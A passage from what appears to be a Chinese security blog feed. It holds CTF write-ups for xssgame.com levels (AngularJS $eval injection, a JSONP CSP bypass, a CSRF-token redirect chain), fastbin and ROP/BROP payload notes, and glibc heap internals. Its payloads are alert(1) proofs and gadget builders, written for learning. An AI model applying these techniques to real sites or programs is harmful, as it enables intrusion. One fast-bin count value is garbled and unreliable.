<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>demo2-query<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span> <span class="token attr-name">maxlength</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>140<span class="token punctuation">"</span></span> <span class="token attr-name">ng-model</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Enter query here...<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utm_term<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utm_campaign<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>cpc<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>交了一个<code>?utm_term=ssssss&quot;&gt;</code>,发现引号被搞成<code>&amp;quot;</code>了</p>
<p>感觉angular肯定是这个能在引号里使用表达式,能不能直接在<code>value=&quot;&quot;</code>里使用什么技能调用<code>alert</code>…</p>
<p>稍微学习了一下<br>果然有个<code>$eval</code>,配合我们这里的</p>
<pre class="line-numbers language-javascript"><code class="language-javascript">angular<span class="token punctuation">.</span><span class="token function">module</span><span class="token punctuation">(</span><span class="token string">'myApp'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">controller</span><span class="token punctuation">(</span><span class="token string">'myController'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'$scope'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>$scope<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    $scope<span class="token punctuation">.</span>query <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
    $scope<span class="token punctuation">.</span>alert <span class="token operator">=</span> window<span class="token punctuation">.</span>alert<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以提交</p>
<pre><code>?utm_term={{$eval(alert(1))}}
</code></pre><p>就可以了, 这里的<code>alert</code>是<code>$scope.alert</code><br>最后</p>
<pre><code>http://www.xssgame.com/f/JFTG_t7t3N-P/?utm_campaign={{$eval(alert(1))}}
</code></pre><blockquote>
<p>由于blog后边是handlebars渲染…所以这里的花括号alert秘制报错..只能放到```里</p>
</blockquote>
<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>这次是服务器端模板渲染<br>有个东西叫SSTI,服务器端模板注入</p>
<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>这题是bypass csp<br>看了下题目中就有个jsonp…</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">/**
 * Ask server side what to display.
 */</span>
<span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> m <span class="token operator">=</span> location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token string">'menu=(.*)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> menu <span class="token operator">=</span> m <span class="token operator">?</span> <span class="token function">atob</span><span class="token punctuation">(</span>m<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">'about'</span><span class="token punctuation">;</span>
    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;script src="jsonp?menu='</span> <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>menu<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'">&lt;/script>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">/**
 * Display stuff returned from server side.
 * @param {string} data - JSON data from server side
 */</span>
<span class="token keyword">function</span> <span class="token function">callback</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>title<span class="token punctuation">)</span> document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;h1>'</span> <span class="token operator">+</span> data<span class="token punctuation">.</span>title <span class="token operator">+</span> <span class="token string">'&lt;/h1>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>pictures<span class="token punctuation">)</span> data<span class="token punctuation">.</span>pictures<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;img src="/static/img/'</span> <span class="token operator">+</span> url <span class="token operator">+</span> <span class="token string">'">&lt;br>&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们请求一下这个jsonp<br><code>http://www.xssgame.com/f/wmOM2q5NJnZS/jsonp?menu=&lt;script&gt;alert(1)&lt;/script&gt;</code><br>会发现返回</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"title"</span><span class="token punctuation">:</span><span class="token string">"Error, no such menu: &lt;script>alert(123)&lt;/script>"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这个title会被原样填到h1里面,这个时候,就….<br>醒醒,这里有csp…没有unsafe-inline的话这样子写到页面里会被kill掉</p>
<p>这里要利用jsonp来bypass csp,jsonp的服务器端大约是这样子</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  
<span class="token variable">$callback</span> <span class="token operator">=</span> <span class="token string">'callback'</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'callback'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'callback'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$callback</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'callback'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">// 其实是还要找一下menu提交的图片是不是找得到,这个省略了</span>
<span class="token variable">$arr</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'title'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'xxx'</span><span class="token punctuation">,</span><span class="token string">'pictures'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'xxx'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token keyword">echo</span> <span class="token variable">$callback</span><span class="token punctuation">.</span><span class="token string">"($result)"</span><span class="token punctuation">;</span>  
<span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>所以我们提交menu=<code>&lt;script src=&quot;jsonp?callback=alert(1);//&quot;&gt;&lt;/script&gt;</code>的base64值就可以了</p>
<p>最后<br><code>http://www.xssgame.com/f/wmOM2q5NJnZS/?menu=PHNjcmlwdCBzcmM9Impzb25wP2NhbGxiYWNrPWFsZXJ0KDEpOy8vIj48L3NjcmlwdD4=</code></p>
<h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>上来设置个用户名,发现走的是这个链接<br><code>http://www.xssgame.com/f/d9u16LTxchEi/set?name=name&amp;value=wwww&amp;redirect=index</code><br>看起来是设置键值对的.这里设置的是name,那应该其他的值也能设置??<br>然后下面还有个功能是设置amount,我们随便设置一个aaa<br>发现会告诉你不是数字.并且会回显,那xss点应该就在这个地方了<br>我们交个<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<blockquote>
<p>Sorry, but this URL is specific to your random CSRF token, which means that the solution wouldn’t work in an other browser, so not counting this as a valid solution. Try harder.</p>
</blockquote>
<p>然后看看我们的链接是<br><code>http://www.xssgame.com/f/d9u16LTxchEi/transfer?name=sss&amp;amount=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;csrf_token=Q63O6XH1QY</code></p>
<p>不难发现这个token是存在cookie里的</p>
<p>所以我想,这样子就可以了,一边在set这里设置csrf_token的值,一边在redirect到transfer填上它<br><code>http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&amp;value=456&amp;redirect=transfer?csrf_token=456&amp;amount=%3Cscript%3Ealert%281%29%3C%2Fscript%3E</code><br>然后…没报错回显<br>在chrome里看一下,是这个transfer时候只是redirect到了<code>transfer?csrf_token=456</code>,忘了把<code>redirect=transfer?csrf_token=456&amp;amount=&lt;script&gt;alert(1)&lt;/script&gt;</code>要escape一下,是<code>redirect=transfer%3Fcsrf_token%3D456%26amount%3D%3Cscript%3Ealert%281%29%3C%2fscript%3E</code></p>
<p>最后<br><code>http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&amp;value=456&amp;redirect=transfer%3Fcsrf_token%3D456%26amount%3D%3Cscript%3Ealert%281%29%3C%2fscript%3E</code></p>
<p>结束</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[fast bin漏洞利用]]></title>
      <url>/2017/07/25/fast-bin%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
      <content type="html"><![CDATA[<p><a href="http://www.vuln.cn/6653" target="_blank" rel="external">http://www.vuln.cn/6653</a><br><a href="http://www.vuln.cn/6654" target="_blank" rel="external">http://www.vuln.cn/6654</a><br><a href="http://www.cnblogs.com/Ox9A82/p/5865420.html" target="_blank" rel="external">http://www.cnblogs.com/Ox9A82/p/5865420.html</a></p>
<p>顺便mark下,明天看完<br><a href="http://bobao.360.cn/ctf/detail/189.html" target="_blank" rel="external">http://bobao.360.cn/ctf/detail/189.html</a><br><a href="http://bobao.360.cn/learning/detail/3694.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3694.html</a></p>
<p>fastbin的检查大概就只有两个</p>
<ol>
<li>现在malloc的和栈顶的不能是同一个chunk, 可以用 <code>a -&gt; b -&gt; a</code>, 这样来绕过</li>
<li>要malloc出来的chunk的size要是符合大小的, 所以一般控制 <code>a -&gt; fd</code> 为 某一可控的 <code>controll_addr - size_t</code>, 这样<code>controll_addr</code>就会被认为是<code>fake_chunk</code>的<code>size</code>…在这个可控地址上写一个合适的<code>size</code>, 就OK了</li>
</ol>
<pre class="line-numbers language-c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
size_t victim_idx <span class="token operator">=</span> <span class="token function">fastbin_index</span> <span class="token punctuation">(</span><span class="token function">chunksize</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 我们fake_chunk的size取出来</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>victim_idx <span class="token operator">!=</span> idx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//如果我们fake的size和nb对应的下标不同, 就说明这个fastbin的大小不合适</span>
    <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): memory corruption (fast)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      
        <categories>
            
            <category> trick </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 学习 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一些点滴关于pwn]]></title>
      <url>/2017/07/25/%E4%B8%80%E4%BA%9B%E7%82%B9%E6%BB%B4%E5%85%B3%E4%BA%8Epwn/</url>
      <content type="html"><![CDATA[<h2 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h2><p>ELF魔数 <code>7f 45 4c 46</code>就是<code>\7fELF</code></p>
<h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>如果没有开PIE:<br>x86 是 0x8048000<br>x64 是 0x400000</p>
<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>x86栈地址开始于 0xFFFF FFFF<br>x64栈地址开始于 0x0000 7FFF FFFF FFFF</p>
<p>栈地址开始的地方也应该是可使用的最大地址吧</p>
<h2 id="x64传参"><a href="#x64传参" class="headerlink" title="x64传参"></a>x64传参</h2><p>RDI, RSI, RDX, RCX, R8和 R9</p>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><pre class="line-numbers language-python"><code class="language-python">p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn100'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span><span class="token string">'-x'</span><span class="token punctuation">,</span><span class="token string">'sh'</span><span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">]</span>
gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="x64-通用gadgets"><a href="#x64-通用gadgets" class="headerlink" title="x64 通用gadgets"></a>x64 通用gadgets</h2><p>蒸米的文章中提到的libc里会存在</p>
<pre class="line-numbers language-c"><code class="language-c">pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样子的gadgets, 我们编译一个x64的程序<code>objdump -M intel -d</code>观察一下<br>这个参数是用intel的,默认的ATT看着好不习惯</p>
<pre class="line-numbers language-asm"><code class="language-asm">*  4007a0:    4c 89 ea                 mov    rdx,r13
*  4007a3:    4c 89 f6                 mov    rsi,r14
*  4007a6:    44 89 ff                 mov    edi,r15d
*  4007a9:    41 ff 14 dc              call   QWORD PTR [r12+rbx*8]
  4007ad:    48 83 c3 01              add    rbx,0x1
  4007b1:    48 39 eb                 cmp    rbx,rbp
  4007b4:    75 ea                    jne    4007a0 <__libc_csu_init+0x40>
*  4007b6:    48 83 c4 08              add    rsp,0x8
*  4007ba:    5b                       pop    rbx
*  4007bb:    5d                       pop    rbp
*  4007bc:    41 5c                    pop    r12
*  4007be:    41 5d                    pop    r13
*  4007c0:    41 5e                    pop    r14
*  4007c2:    41 5f                    pop    r15
*  4007c4:    c3                       ret
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里其实有两个有用的gadgets</p>
<p>另外最后这里的<code>pop r15; ret</code> 对应字节为<code>0x41 0x5f 0xc3</code>,只取后两个字节就是<code>0x5f 0xc3</code>对应其实就是<code>pop rdi; ret</code></p>
<p>在HCTF2016的BROP题目Flappy Pig的<a href="http://bobao.360.cn/ctf/detail/179.html" target="_blank" rel="external">wp</a>里学到,如何找到这个<code>pop rdi; ret</code><br>原题目是没有给binary的,爆破先找到一个能够不报错的返回地址下面称为safe_addr<br>然后wp里写道,如果找到这样子一个addr满足下面条件</p>
<pre class="line-numbers language-python"><code class="language-python">Payload1 <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">72</span> <span class="token operator">+</span> l64<span class="token punctuation">(</span>addr<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">+</span>l64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>l64<span class="token punctuation">(</span>safe_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop r15; ret</span>
Payload2 <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">72</span> <span class="token operator">+</span> l64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token operator">+</span>l64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>l64<span class="token punctuation">(</span>safe_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop rdi; ret</span>
Payload3 <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">72</span> <span class="token operator">+</span> l64<span class="token punctuation">(</span>addr<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span>l64<span class="token punctuation">(</span>safe_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># ret</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>那么这个addr就是我们要找到的<code>pop rdi; ret</code><br>并且这题wp写的很赞<br>dump内存用puts就可以了,也可以write是嘛</p>
<p>另外关于BROP可以看看<a href="http://blog.csdn.net/qq_32400847/article/details/71190093" target="_blank" rel="external">这个</a>,真的真的perfect</p>
<p>关于这个通用gadgets,在lctf 2016的wp里找到了这个记下来</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">com_gadget</span><span class="token punctuation">(</span>part1<span class="token punctuation">,</span> part2<span class="token punctuation">,</span> jmp2<span class="token punctuation">,</span> arg1 <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> arg2 <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> arg3 <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload  <span class="token operator">=</span> p64<span class="token punctuation">(</span>part1<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># rbx be 0x0</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># rbp be 0x1</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>jmp2<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># r12 jump to</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>arg3<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># r13 -> rdx    arg3</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>arg2<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># r14 -> rsi    arg2</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>arg1<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># r15 -> edi    arg1</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>part2<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># part2 entry will call [rbx + r12 + 0x8]</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">56</span>     <span class="token comment" spellcheck="true"># junk</span>
    <span class="token keyword">return</span> payload
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>另外这个gadget其实</p>
<pre class="line-numbers language-c"><code class="language-c">gdb<span class="token operator">-</span>peda$ x<span class="token operator">/</span>8i <span class="token number">0x000000000040075c</span>
   <span class="token number">0x40075c</span><span class="token punctuation">:</span>    pop    r12
   <span class="token number">0x40075e</span><span class="token punctuation">:</span>    pop    r13
   <span class="token number">0x400760</span><span class="token punctuation">:</span>    pop    r14
   <span class="token number">0x400762</span><span class="token punctuation">:</span>    pop    r15
   <span class="token number">0x400764</span><span class="token punctuation">:</span>    ret
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在这里偏移一个字节就会变成,控制rsp改变栈顶,但感觉比较危险</p>
<pre class="line-numbers language-c"><code class="language-c">gdb<span class="token operator">-</span>peda$ x<span class="token operator">/</span>8i <span class="token number">0x000000000040075d</span>
   <span class="token number">0x40075d</span><span class="token punctuation">:</span>    pop    rsp
   <span class="token number">0x40075e</span><span class="token punctuation">:</span>    pop    r13
   <span class="token number">0x400760</span><span class="token punctuation">:</span>    pop    r14
   <span class="token number">0x400762</span><span class="token punctuation">:</span>    pop    r15
   <span class="token number">0x400764</span><span class="token punctuation">:</span>    ret
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>同样r13~r15往下偏移分别能得到rbp, rsi, rdi</p>
<p>这个利用方法,,,今天才看到<a href="http://www.cnblogs.com/Ox9A82/p/5487725.html" target="_blank" rel="external">这篇文章</a><br>原来是这样子…..wopu</p>
<h2 id="没有给lic的时候"><a href="#没有给lic的时候" class="headerlink" title="没有给lic的时候"></a>没有给lic的时候</h2><ol>
<li>用DynELF</li>
<li>在<a href="http://www.cnblogs.com/0xJDchen/p/6175651.html" target="_blank" rel="external">这篇文章</a>里看到可以使用这个叫做libc-database的方法<br>工具在<a href="https://github.com/niklasb/libc-database" target="_blank" rel="external">这里</a>,里面提到<blockquote>
<p>Only the last 12 bits are checked, because randomization usually works on page size level<br>我试了下好像,,,果然是这样子,低位确实是不变的</p>
</blockquote>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[关于堆]]></title>
      <url>/2017/07/25/%E5%85%B3%E4%BA%8E%E5%A0%86/</url>
      <content type="html"><![CDATA[<h2 id="前面"><a href="#前面" class="headerlink" title="前面"></a>前面</h2><p>网上一个博主说感觉Linux下堆内存分配不如windows下安全<br>这篇主要是参考自Sploitfun的<a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/" target="_blank" rel="external">blog</a>,然后才发现网络上好多堆相关的文章配图都来自这里</p>
<h2 id="前面-1"><a href="#前面-1" class="headerlink" title="前面"></a>前面</h2><p>Glibc使用的是<code>ptmalloc2</code>,是<code>fork</code>自<code>dlmalloc</code><br>malloc底层其实是调用了<code>brk</code>或者<code>mmap</code></p>
<h2 id="emmmm"><a href="#emmmm" class="headerlink" title="emmmm"></a>emmmm</h2><p>作者写太好了,翻译不出来,看英文好了</p>
<h3 id="allocated-chunk"><a href="#allocated-chunk" class="headerlink" title="allocated chunk"></a>allocated chunk</h3><p>没有fd,bk…本来应该放这些指针的空间现在用来存储数据<br><code>previous size</code>这个字段,如果previous的块是空闲的,那么这个字段确实存储的是<code>previous size</code>,否则,这一块也丢给上一个块存数据…这样子听起来好像把这个字段送给别人的感觉,ahhhhhh~</p>
<pre><code>+---------------+ ==
previous size   + |
+---------------+ |
size | N | M |P + |  chunk[xxx]
+---------------+ |
User data       + |
+---------------+ ==
previous size   + ----&gt; 由于chunk[xxx]以及分配,这个也存放`chuck[xxx]`的User data
----------------+ |
......
</code></pre><p>我有一个问题,就是…我们在malloc的时候给的一个size,到这里指的是,上图的<code>User data</code>,还是<code>User Data</code>加上下一块的这个<code>previous size</code><br>感觉应该是不算???</p>
<h3 id="Free-chunk"><a href="#Free-chunk" class="headerlink" title="Free chunk"></a>Free chunk</h3><pre><code>+---------------+ ====
previous size --+------&gt; 因为空闲块都会合并,前面的块一定是allocated的,这里存的就是User data
+---------------+ |
size | N | M |P + |  chunk[xxx]
+---------------+ |
fd ---------------+---&gt; to next chunk [Free]
bk ---------------+---&gt; to previous chunk [Free]
User data       + |
+---------------+ ====
previous size   + -----&gt; 因为chunk[xxx]是Free的,所以这里存的就是previous size
----------------+ |
......
</code></pre><p>所有的free的chunk会串联成一串就是叫做<code>bins list</code></p>
<p>所这样子看起来,正常情况,只有一种<code>previous size</code> 的用途不确定(可能不适用于Fast bin???)</p>
<table>
<thead>
<tr>
<th>当前块</th>
<th>当前块previous</th>
<th>下一块previous</th>
</tr>
</thead>
<tbody>
<tr>
<td>allocated</td>
<td>未知</td>
<td>存上一块data</td>
</tr>
<tr>
<td>free</td>
<td>存上一块Data</td>
<td>存previous size</td>
</tr>
</tbody>
</table>
<h2 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h2><p>根据chunk大小分为</p>
<h3 id="Fast-bin"><a href="#Fast-bin" class="headerlink" title="Fast bin"></a>Fast bin</h3><p>大小: 16 - 80字节<br>数量: 10101010101010101010<br>特点: 每个中存储的是单向链表, 并且链上的chunk是LIFO的</p>
<h3 id="其他-bin"><a href="#其他-bin" class="headerlink" title="其他 bin"></a>其他 bin</h3><p>这其他的都是双向链表,所以每一表项有fd,bk两项</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">struct</span> <span class="token punctuation">{</span>
<span class="token keyword">void</span> <span class="token operator">*</span> fd<span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token operator">*</span> bk
<span class="token punctuation">}</span>bins<span class="token punctuation">[</span><span class="token punctuation">]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted bin"></a>Unsorted bin</h4><p>大小: 任意<br>数量: 1 (Bin1)<br>特点: Small chunck, Large chunck被Free掉的时候,就来到了这里,这样子就可以用两次再回到原表里</p>
<h4 id="Small-bin"><a href="#Small-bin" class="headerlink" title="Small bin"></a>Small bin</h4><p>大小: 小于512字节<br>数量: 62 (Bin2~Bin63)<br>特点: 8字节递增</p>
<p>Bin2: 16字节<br>…<br>Bin63: 63 * 8 = 504字节</p>
<h4 id="Large-bin"><a href="#Large-bin" class="headerlink" title="Large bin"></a>Large bin</h4><p>大小: 大于等于512字节<br>数量: 63<br>特点: 比较迷乱,看下面</p>
<ul>
<li>32 bins contain binlist of chunks of size which are 64 bytes apart. ie) First large bin (Bin 65) contains binlist of chunks of size 512 bytes to 568 bytes, second large bin (Bin 66) contains binlist of chunks of size 576 bytes to 632 bytes and so on…</li>
<li>16 bins contain binlist of chunks of size which are 512 bytes apart.</li>
<li>8 bins contain binlist of chunks of size which are 4096 bytes apart.</li>
<li>4 bins contain binlist of chunks of size which are 32768 bytes apart.</li>
<li>2 bins contain binlist of chunks of size which are 262144 bytes apart.</li>
<li>1 bin contains a chunk of remaining size.</li>
</ul>
<h3 id="Top-chunck"><a href="#Top-chunck" class="headerlink" title="Top chunck"></a>Top chunck</h3><p>Top chunk 不属于任何bin,找不到任何合适的bin的时候才会使用Top chunk</p>
<h2 id="存储bin的数据结构"><a href="#存储bin的数据结构" class="headerlink" title="存储bin的数据结构"></a>存储bin的数据结构</h2><p>fastbinsY: This array hold fast bins.<br>bins: This array hold unsorted, small and large bins. Totally there are 126 bins and its divided as follows:</p>
<ul>
<li>Bin 1 –&gt; Unsorted bin</li>
<li>Bin 2 to Bin 63 –&gt; Small bin</li>
<li>Bin 64 to Bin 126 –&gt; Large bin</li>
</ul>
